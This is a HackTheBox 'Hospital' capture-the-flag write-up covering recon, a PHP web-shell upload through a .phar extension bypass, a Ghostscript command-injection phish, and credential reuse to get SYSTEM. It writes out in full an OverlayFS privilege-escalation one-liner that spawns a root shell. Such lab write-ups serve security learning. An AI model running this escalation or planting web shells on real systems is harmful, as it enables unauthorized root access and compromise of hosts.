---
title: "Hospital"
date: 2023-11-20T11:30:03+00:00
draft: false
tags: ["htb", "Windows"]
description: "Hospital HacktheBox Writeup"
---



![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png)

## Intro

Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc

## Initial Recon

```bash
PORT     STATE SERVICE          REASON
22/tcp   open  ssh              syn-ack ttl 62
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
443/tcp  open  https            syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
1801/tcp open  msmq             syn-ack ttl 127
2103/tcp open  zephyr-clt       syn-ack ttl 127
2105/tcp open  eklogin          syn-ack ttl 127
2107/tcp open  msmq-mgmt        syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
3389/tcp open  ms-wbt-server    syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127
6065/tcp open  winpharaoh       syn-ack ttl 127
6403/tcp open  boe-cachesvr     syn-ack ttl 127
6406/tcp open  boe-processsvr   syn-ack ttl 127
6407/tcp open  boe-resssvr1     syn-ack ttl 127
6409/tcp open  boe-resssvr3     syn-ack ttl 127
6617/tcp open  unknown          syn-ack ttl 127
6635/tcp open  mpls-udp         syn-ack ttl 127
8080/tcp open  http-proxy       syn-ack ttl 62
9389/tcp open  adws             syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds
                                                                                                                    
❯ cat Script_TCP_10.10.11.241.nmap
# Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241
Nmap scan report for 10.10.11.241
Host is up (0.48s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-02-24T17:09:39
|_Not valid after:  2024-08-25T17:09:39
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-26T01:03:21+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6065/tcp open  msrpc             Microsoft Windows RPC
6403/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  msrpc             Microsoft Windows RPC
6407/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6409/tcp open  msrpc             Microsoft Windows RPC
6617/tcp open  msrpc             Microsoft Windows RPC
6635/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-02-26T01:03:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

Following our nmap scans, first off we check out the websites on ports `8080` and `443`.

## Web Enumeration

Loading out the websites on the respective ports, on port `443` we are met with a login site same case applies to port `8080`

![port 443](https://imgur.com/mG8iUuG.png)

![port 8080](https://imgur.com/tG024km.png)

### Fuzzing

The next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.
```bash
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]
.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms]
.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms]
.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms]
failed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms]
login.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
register.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]
success.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms]
uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]
```

First thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.
![](https://imgur.com/sZNmuyx.png)

After logging in we are redirected to a page where we can upload files on the webpage.
![](https://imgur.com/ySaSfRw.png)

Look at this instantly we need to try out some file upload attacks and since we have the [resources](https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------) to do so. We see that we can that we can upload a `.phar` file instead of a php file which subsequently involves getting a shell through accessing the uploads file. 

From my research i opted to go with [powny](https://github.com/flozz/p0wny-shell) a very basic, single-file, PHP shell. After changing the extension to `phar` extension, we get a successful upload response.
From our fuzzing earlier we saw an `/uploads` which can basically access files that we've uploaded, which triggers a shell on the box.

![](https://imgur.com/Zc1hBoJ.png)


## Initial Access.
Having landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using [pwncat](https://github.com/calebstewart/pwncat). Where we get an active session.
![](https://imgur.com/1CxIELr.png)

### Enumeration.

Running some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.
![](https://imgur.com/ETUmbkq.png)


![](https://imgur.com/JRWLY6J.png)

A username called `drwilliams` trying to access his folder we are given permission denied as we are `www-data` and can't access content inside his folder due to insufficient permissions.

![](https://imgur.com/kipG9XY.png)


## Privesc 

Checking for vulnerabilities pertaining the system version we land on `CVE-2023–2640` a vulnerability that affects the Ubuntu kernel’s OverlayFS module.

First off we need to identify if our system is running overlay.

![](https://imgur.com/v18baZ9.png) 

and we see its running overlay to exploit this there's a public [POC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
```

which when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.

Running the `POC` we get some root access.
![](https://imgur.com/QnESbaR.png)

Now having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get `drwilliams`'s hash.Cracking the hash we get the password.

![](https://imgur.com/Aa2jFb3l.png)

which when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to `drwilliams` concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices [poc](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)

![](https://imgur.com/FLksOng.png)

After reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out [vsosciety_](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript)

![](https://imgur.com/zJ8a8Gg.png)

## Windows Foothold.

After sending the payload, we receive a connection back.

![](https://imgur.com/kra6hpU.png)

![](https://imgur.com/oNcq1q2.png)

Navigating to the `/Desktop` directory we get the user flag.

![](https://imgur.com/oNcq1q2.png)

Further checking the `bat` file on the Documents directory we identify that there is an embedded password on the bat file.

![](https://imgur.com/dKv1o8q.png)

## Enumerating RPCCLIENT
Having the credentials and the information from our scans, `RPC` is open, trying out the creds we got on the bat file, we get access.

## ROOT Foothold
![](https://imgur.com/3G18Iz7.png)

Going back to the windows shell instance and enumerating further on the root directory there's a `xampp` directory which has `htdocs` where all the programs for the web pages will be stored.

![](https://imgur.com/30Z8nOy.png)

Notably, we can see there's a `shell.php` laying around. I replace the Content with that PHP Powny Shell.
You will get a Shell as Administrator and finally the Root Flag.

![](https://imgur.com/TXTDJdT.png)

Checking out pownyshell we get `system` access. 

![](https://imgur.com/u0zg5rf.png)
